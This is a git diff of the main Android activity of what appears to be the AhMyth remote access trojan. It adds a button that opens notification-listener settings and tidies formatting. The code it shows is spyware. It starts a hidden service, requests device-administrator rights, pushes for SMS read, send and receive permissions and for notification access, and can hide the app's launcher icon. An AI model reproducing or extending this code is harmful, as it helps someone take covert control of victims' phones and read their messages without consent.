@@ -1,5 +1,6 @@
 package ahmyth.mine.king.ahmyth;
 
+
 import android.Manifest;
 import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
@@ -15,6 +16,7 @@ import android.provider.Settings;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.view.View;
+import android.widget.Button;
 import android.widget.CompoundButton;
 import android.widget.Switch;
 import android.widget.Toast;
@@ -31,9 +33,18 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         MainService.startService(this);
         setContentView(R.layout.activity_main);
+        Button btnListener = findViewById(R.id.listenerBtn);
+
+        btnListener.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                startActivity(intent);
+            }
+        });
 
         componentName = new ComponentName(this, AdminReceiver.class);
-        devicePolicyManager = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);
+        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
 
         if (!NotificationManager.isNotificationServiceEnabled(this)) {
             NotificationManager.openNotificationSettings(this);
@@ -41,9 +52,8 @@ public class MainActivity extends Activity {
         }
         if (devicePolicyManager.isAdminActive(componentName)) {
 //            Log.d("MY_TAG","Ok then");
-        }
-        else {
-            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+        } else {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
             startActivity(intent);
@@ -51,11 +61,11 @@ public class MainActivity extends Activity {
 
         if (
                 ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
-                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&
-                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
-        ){
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
+        ) {
             Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-            mIntent.setData(Uri.parse("package:"+getPackageName()));
+            mIntent.setData(Uri.parse("package:" + getPackageName()));
             startActivity(mIntent);
             Toast.makeText(this, "Grant all permission before!", Toast.LENGTH_LONG).show();
         }
@@ -66,7 +76,7 @@ public class MainActivity extends Activity {
 
 //        finish();
 
-        if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.P){
+        if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
 
             Switch hide_icon_switch = findViewById(R.id.switch1);
             hide_icon_switch.setVisibility(View.VISIBLE);
@@ -78,23 +88,22 @@ public class MainActivity extends Activity {
                 @Override
                 public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
 
-                    appSettingEditor.putBoolean("hidden_status",isChecked);
+                    appSettingEditor.putBoolean("hidden_status", isChecked);
                     appSettingEditor.commit();
                 }
             });
 
-            boolean icon_hidden_status = sharedPreferences.getBoolean("hidden_status",false);
+            boolean icon_hidden_status = sharedPreferences.getBoolean("hidden_status", false);
 
-            if (icon_hidden_status){
+            if (icon_hidden_status) {
                 fn_hideicon();
                 hide_icon_switch.setChecked(true);
-            }
-            else {
+            } else {
                 hide_icon_switch.setChecked(false);
             }
         }
     }
-    
+
 
     public void fn_hideicon() {
         getPackageManager().setComponentEnabledSetting(getComponentName(),
@@ -103,7 +112,7 @@ public class MainActivity extends Activity {
     }
 
 
-//    for activity_main functionality
+    //    for activity_main functionality
     public void openGooglePlay(View view) {
         Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
         startActivity(GoogleIntent);
